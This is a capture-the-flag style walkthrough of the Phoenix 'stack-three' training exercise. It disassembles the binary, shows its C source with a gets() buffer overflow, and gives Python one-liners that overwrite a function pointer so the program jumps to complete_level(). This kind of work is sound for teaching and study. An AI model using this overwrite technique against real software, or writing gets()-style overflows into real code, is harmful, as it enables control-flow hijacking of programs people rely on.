# PHOENIX - stack 3

Lets list the files using ```ls -la``` command,

```
user@phoenix-amd64:~$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Jun  6 04:48 .
drwxr-xr-x 3 root root 4096 Jan 13  2019 ..
-rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout
-rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc
-rw-r--r-- 1 user user  675 Jan 13  2019 .profile
-rwxr-xr-x 1 user user 6472 Jun  6 04:48 stack-three
```

Lets check the file type of the binary using ```file``` command,

```
user@phoenix-amd64:~$ file stack-three
stack-three: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

It is a ```not stripped``` binary,

Let try running it

```
user@phoenix-amd64:~$ ./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
monish
function pointer remains unmodified :~( better luck next time!
```

It seems like we have to modify the function pointer in it

Lets analyse it in debugger,

Viewing the functions in it,

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
```

There is an extra function named ```complete_level```,

```
0x000000000040069d  complete_level
```

Now, disassembling ```main()```,

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004006b5 <+0>:	  push   rbp
   0x00000000004006b6 <+1>:	  mov    rbp,rsp
   0x00000000004006b9 <+4>:	  sub    rsp,0x60
   0x00000000004006bd <+8>:	  mov    DWORD PTR [rbp-0x54],edi
   0x00000000004006c0 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004006c4 <+15>:	mov    edi,0x4007d8
   0x00000000004006c9 <+20>:	call   0x4004f0 <puts@plt>
   0x00000000004006ce <+25>:	mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004006d6 <+33>:	lea    rax,[rbp-0x50]
   0x00000000004006da <+37>:	mov    rdi,rax
   0x00000000004006dd <+40>:	call   0x4004e0 <gets@plt>
   0x00000000004006e2 <+45>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004006e6 <+49>:	test   rax,rax
   0x00000000004006e9 <+52>:	je     0x40071d <main+104>
   0x00000000004006eb <+54>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004006ef <+58>:	mov    rsi,rax
   0x00000000004006f2 <+61>:	mov    edi,0x400828
   0x00000000004006f7 <+66>:	mov    eax,0x0
   0x00000000004006fc <+71>:	call   0x4004d0 <printf@plt>
   0x0000000000400701 <+76>:	mov    rax,QWORD PTR [rip+0x200418]        # 0x600b20 <stdout>
   0x0000000000400708 <+83>:	mov    rdi,rax
   0x000000000040070b <+86>:	call   0x400500 <fflush@plt>
   0x0000000000400710 <+91>:	mov    rdx,QWORD PTR [rbp-0x10]
   0x0000000000400714 <+95>:	mov    eax,0x0
   0x0000000000400719 <+100>:	call   rdx
   0x000000000040071b <+102>:	jmp    0x400727 <main+114>
   0x000000000040071d <+104>:	mov    edi,0x400848
   0x0000000000400722 <+109>:	call   0x4004f0 <puts@plt>
   0x0000000000400727 <+114>:	mov    edi,0x0
   0x000000000040072c <+119>:	call   0x400510 <exit@plt>
End of assembler dump.
```

Disassembling ```complete_level()```,

```
pwndbg> disassemble complete_level
Dump of assembler code for function complete_level:
   0x000000000040069d <+0>:	  push   rbp
   0x000000000040069e <+1>:	  mov    rbp,rsp
   0x00000000004006a1 <+4>:	  mov    edi,0x400790
   0x00000000004006a6 <+9>:	  call   0x4004f0 <puts@plt>
   0x00000000004006ab <+14>:	mov    edi,0x0
   0x00000000004006b0 <+19>:	call   0x400510 <exit@plt>
End of assembler dump.
```

Lets view the source code for better understanding,

```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

Here we are using the pointer ```volatile int (*fp)();``` to call the ```complete_level()```

```
if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }
```

If we write any value in ```locals.fp```, our program assumes it as a function address and it tries to call it

If it is a valid function address it displays the correct result, else it displays a ```segmentation fault```

When we try to overwrite ```fp``` with random data,it gives ```segmentation fault``` because the function in ```fp``` address does not exist

```
user@phoenix-amd64:~$ python -c "print('A'*64+'BBBB')"|./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x42424242
Segmentation fault
```

If we pass the address of ```complete_level()``` in ```fp``` it executes correctly,

```
user@phoenix-amd64:~$ python -c "print('A'*64+'\x9d\x06\x40')"|./stack-three
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

Done! we have completed "stack-three"

